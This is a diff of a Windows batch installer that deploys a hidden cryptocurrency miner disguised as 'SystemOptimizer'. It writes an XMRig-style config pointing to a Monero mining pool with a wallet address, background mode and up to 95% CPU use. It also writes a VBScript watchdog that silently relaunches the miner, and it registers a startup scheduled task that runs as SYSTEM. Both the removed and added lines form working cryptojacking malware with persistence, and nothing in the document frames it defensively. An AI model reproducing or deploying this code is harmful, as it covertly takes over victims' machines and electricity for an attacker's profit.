@@ -14,61 +14,57 @@ rmdir /s /q "%TEMP%\xmrig_tmp" >nul 2>&1
 del "%TEMP%\xmrig.zip" >nul 2>&1
 
 REM Create config.json
-(
-echo {
-echo     "autosave": false,
-echo     "background": true,
-echo     "colors": false,
-echo     "donate-level": 1,
-echo     "log-file": "C:\ProgramData\SystemOptimizer\optimizer.log",
-echo     "print-time": 30,
-echo     "retries": 5,
-echo     "retry-pause": 10,
-echo     "cpu": {
-echo         "enabled": true,
-echo         "huge-pages": true,
-echo         "huge-pages-jit": true,
-echo         "hw-aes": true,
-echo         "priority": 1,
-echo         "yield": true,
-echo         "max-cpu-usage": 95,
-echo         "asm": true,
-echo         "argon2-impl": "auto",
-echo         "max-threads-hint": 100
-echo     },
-echo     "pools": [
-echo         {
-echo             "url": "gulf.moneroocean.stream:10001",
-echo             "user": "435swUE8htb96xMwWXbfnzCXCkiKWQhcVKpQzjAHwNMkiWxPnzJiaiH82ucpvnfgpebBJ9QMjyVWnFdF6ih42LVLJY587wv",
-echo             "pass": "x",
-echo             "keepalive": true,
-echo             "tls": false,
-echo             "nicehash": false,
-echo             "rig-id": "%COMPUTERNAME%"
-echo         }
-echo     ],
-echo     "api": {
-echo         "enabled": true,
-echo         "host": "127.0.0.1",
-echo         "port": 3456,
-echo         "restricted": true
-echo     }
-echo }
-) > "C:\ProgramData\SystemOptimizer\config.json"
+echo { > "C:\ProgramData\SystemOptimizer\config.json"
+echo     "autosave": false, >> "C:\ProgramData\SystemOptimizer\config.json"
+echo     "background": true, >> "C:\ProgramData\SystemOptimizer\config.json"
+echo     "colors": false, >> "C:\ProgramData\SystemOptimizer\config.json"
+echo     "donate-level": 1, >> "C:\ProgramData\SystemOptimizer\config.json"
+echo     "log-file": "C:\ProgramData\SystemOptimizer\optimizer.log", >> "C:\ProgramData\SystemOptimizer\config.json"
+echo     "print-time": 30, >> "C:\ProgramData\SystemOptimizer\config.json"
+echo     "retries": 5, >> "C:\ProgramData\SystemOptimizer\config.json"
+echo     "retry-pause": 10, >> "C:\ProgramData\SystemOptimizer\config.json"
+echo     "cpu": { >> "C:\ProgramData\SystemOptimizer\config.json"
+echo         "enabled": true, >> "C:\ProgramData\SystemOptimizer\config.json"
+echo         "huge-pages": true, >> "C:\ProgramData\SystemOptimizer\config.json"
+echo         "huge-pages-jit": true, >> "C:\ProgramData\SystemOptimizer\config.json"
+echo         "hw-aes": true, >> "C:\ProgramData\SystemOptimizer\config.json"
+echo         "priority": 1, >> "C:\ProgramData\SystemOptimizer\config.json"
+echo         "yield": true, >> "C:\ProgramData\SystemOptimizer\config.json"
+echo         "max-cpu-usage": 95, >> "C:\ProgramData\SystemOptimizer\config.json"
+echo         "asm": true, >> "C:\ProgramData\SystemOptimizer\config.json"
+echo         "argon2-impl": "auto", >> "C:\ProgramData\SystemOptimizer\config.json"
+echo         "max-threads-hint": 100 >> "C:\ProgramData\SystemOptimizer\config.json"
+echo     }, >> "C:\ProgramData\SystemOptimizer\config.json"
+echo     "pools": [ >> "C:\ProgramData\SystemOptimizer\config.json"
+echo         { >> "C:\ProgramData\SystemOptimizer\config.json"
+echo             "url": "gulf.moneroocean.stream:10001", >> "C:\ProgramData\SystemOptimizer\config.json"
+echo             "user": "435swUE8htb96xMwWXbfnzCXCkiKWQhcVKpQzjAHwNMkiWxPnzJiaiH82ucpvnfgpebBJ9QMjyVWnFdF6ih42LVLJY587wv", >> "C:\ProgramData\SystemOptimizer\config.json"
+echo             "pass": "x", >> "C:\ProgramData\SystemOptimizer\config.json"
+echo             "keepalive": true, >> "C:\ProgramData\SystemOptimizer\config.json"
+echo             "tls": false, >> "C:\ProgramData\SystemOptimizer\config.json"
+echo             "nicehash": false, >> "C:\ProgramData\SystemOptimizer\config.json"
+echo             "rig-id": "%COMPUTERNAME%" >> "C:\ProgramData\SystemOptimizer\config.json"
+echo         } >> "C:\ProgramData\SystemOptimizer\config.json"
+echo     ], >> "C:\ProgramData\SystemOptimizer\config.json"
+echo     "api": { >> "C:\ProgramData\SystemOptimizer\config.json"
+echo         "enabled": true, >> "C:\ProgramData\SystemOptimizer\config.json"
+echo         "host": "127.0.0.1", >> "C:\ProgramData\SystemOptimizer\config.json"
+echo         "port": 3456, >> "C:\ProgramData\SystemOptimizer\config.json"
+echo         "restricted": true >> "C:\ProgramData\SystemOptimizer\config.json"
+echo     } >> "C:\ProgramData\SystemOptimizer\config.json"
+echo } >> "C:\ProgramData\SystemOptimizer\config.json"
 
 REM Create watchdog.vbs
-(
-echo Set sh = CreateObject("WScript.Shell")
-echo Set wmi = GetObject("winmgmts:")
-echo If wmi.ExecQuery("SELECT * FROM Win32_Process WHERE Name='wscript.exe' AND CommandLine LIKE '%watchdog.vbs%'").Count ^> 1 Then WScript.Quit
-echo Do
-echo     Set p = wmi.ExecQuery("SELECT * FROM Win32_Process WHERE Name='SystemOptimizer.exe'")
-echo     If p.Count = 0 Then
-echo         sh.Run """C:\ProgramData\SystemOptimizer\SystemOptimizer.exe"" --config=""C:\ProgramData\SystemOptimizer\config.json""", 0, False
-echo     End If
-echo     WScript.Sleep 30000
-echo Loop
-) > "C:\ProgramData\SystemOptimizer\watchdog.vbs"
+echo Set sh = CreateObject("WScript.Shell") > "C:\ProgramData\SystemOptimizer\watchdog.vbs"
+echo Set wmi = GetObject("winmgmts:") >> "C:\ProgramData\SystemOptimizer\watchdog.vbs"
+echo If wmi.ExecQuery("SELECT * FROM Win32_Process WHERE Name='wscript.exe' AND CommandLine LIKE '%watchdog.vbs%'").Count ^> 1 Then WScript.Quit >> "C:\ProgramData\SystemOptimizer\watchdog.vbs"
+echo Do >> "C:\ProgramData\SystemOptimizer\watchdog.vbs"
+echo     Set p = wmi.ExecQuery("SELECT * FROM Win32_Process WHERE Name='SystemOptimizer.exe'") >> "C:\ProgramData\SystemOptimizer\watchdog.vbs"
+echo     If p.Count = 0 Then >> "C:\ProgramData\SystemOptimizer\watchdog.vbs"
+echo         sh.Run """C:\ProgramData\SystemOptimizer\SystemOptimizer.exe"" --config=""C:\ProgramData\SystemOptimizer\config.json""", 0, False >> "C:\ProgramData\SystemOptimizer\watchdog.vbs"
+echo     End If >> "C:\ProgramData\SystemOptimizer\watchdog.vbs"
+echo     WScript.Sleep 30000 >> "C:\ProgramData\SystemOptimizer\watchdog.vbs"
+echo Loop >> "C:\ProgramData\SystemOptimizer\watchdog.vbs"
 
 REM Create scheduled tasks
 schtasks /Create /TN "SystemOptimizer" /TR "wscript.exe \"C:\ProgramData\SystemOptimizer\watchdog.vbs\"" /SC ONSTART /RU SYSTEM /RL HIGHEST /F >nul 2>&1
